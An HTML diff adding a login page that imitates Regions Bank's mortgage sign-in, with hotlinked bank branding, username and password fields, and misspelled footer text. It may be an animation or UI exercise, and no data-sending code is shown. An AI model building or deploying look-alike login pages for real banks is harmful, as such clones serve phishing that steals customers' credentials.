@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="style01.css">
+    <title>Animation page</title>
+</head>
+
+<body>
+    <div class="login-logo-animation login-logo">
+        <img src="https://gcps-foundation.org/wp-content/uploads/2020/02/Regions-Bank-Mortgage-logo.jpg" alt="Logo">
+    </div>
+
+    <div class="container">
+        <!-- Left Side - Login Form -->
+        <div class="login-container" id="loginContainer">
+            <div class="login-header">
+                <div class="login-logo">
+                    <img src="https://gcps-foundation.org/wp-content/uploads/2020/02/Regions-Bank-Mortgage-logo.jpg"
+                        alt="Logo">
+                </div>
+                <div class="new-customer">
+                    <div>
+                        <p>Are you a new customer?</p>
+                    </div>
+                    <div class="enroll-models-button">
+                        <div> <button class="enroll-btn" id="enrollBtn">Enroll Now</button></div>
+                        <div id="enrollModal" class="modal">
+                            <span class="triangle"></span>
+                            <div class="modal-content">
+                                <h2>Enroll now to:</h2>
+                                <ul> 
+                                    
+                                    <li><span class="tick">✓</span>Access to loan</li>
+                                    <li><span class="tick">✓</span>Pay online mortgage</li>
+                                    <li><span class="tick">✓</span>View your mortgage statements</li>
+                                </ul>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <h1 class="animate-text welcome-header">Welcome Back!</h1>
+            <p class="animate-text sign-text">Sign into your Regions MyMortagage account</p> <br>
+            <form id="loginForm">
+                <input type="text" id="username" placeholder="Username" required class="animate-text">
+                <input type="password" id="password" placeholder="Password" required class="animate-text">
+                <label class="animate-text radio-label">
+                    <input type="checkbox" id="rememberMe">
+                    <p> Remember Me</p>
+                </label>
+                <button type="submit" class="animate-text login-btn" disabled>Login</button>
+                <div class="forgot-links animate-text">
+                    <a href="#">Forgot Username?</a> •
+                    <a href="#">Forgot Password?</a>
+                </div>
+            </form>
+            <div class="animate-text footer-text">
+                <p>
+                <p><svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none"
+                        stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"
+                        class="icon icon-tabler icons-tabler-outline icon-tabler-smart-home">
+                        <path stroke="none" d="M0 0h24v24H0z" fill="none" />
+                        <path
+                            d="M19 8.71l-5.333 -4.148a2.666 2.666 0 0 0 -3.274 0l-5.334 4.148a2.665 2.665 0 0 0 -1.029 2.105v7.2a2 2 0 0 0 2 2h12a2 2 0 0 0 2 -2v-7.2c0 -.823 -.38 -1.6 -1.03 -2.105" />
+                        <path d="M16 15c-2.21 1.333 -5.792 1.333 -8 0" />
+                    </svg></p>
+                <p>&nbsp; Equal housing lemder</p>
+                </p> •
+                <p>Member FDIC</p>
+            </div>
+            <div class="animate-text footer-text">
+                <p>©2024 Regiona Finacial Corporation All right reserved .
+                <p class="green-text">1(800)REGIONS</p>
+                </p>
+            </div>
+        </div>
+
+        <!-- Right Side - Background Image -->
+        <div class="image-container">
+            <img src="https://www.bhg.com/thmb/H9VV9JNnKl-H1faFXnPlQfNprYw=/1799x0/filters:no_upscale():strip_icc()/white-modern-house-curved-patio-archway-c0a4a3b3-aa51b24d14d0464ea15d36e05aa85ac9.jpg"
+                id="backgroundImage" alt="Background">
+            <div id="welcomeContent" class="welcome-content">
+                <h2>Welcome Back!</h2>
+                <p>Manage your account efficiently and securely.</p>
+            </div>
+        </div>
+    </div>
+    <!-- Welcome Message -->
+    <div id="welcomeMessage" class="welcome-message">
+        <!-- Logo animation -->
+        <div id="logo" class="logo">
+            <img src="https://gcps-foundation.org/wp-content/uploads/2020/02/Regions-Bank-Mortgage-logo.jpg" alt="Logo">
+        </div>
+
+        <!-- House image -->
+        <img id="houseImage" class="house-image"
+            src="https://www.bhg.com/thmb/H9VV9JNnKl-H1faFXnPlQfNprYw=/1799x0/filters:no_upscale():strip_icc()/white-modern-house-curved-patio-archway-c0a4a3b3-aa51b24d14d0464ea15d36e05aa85ac9.jpg"
+            alt="House Image" />
+    </div>
+
+    <script src="script.js"></script>
+</body>
+
+</html>
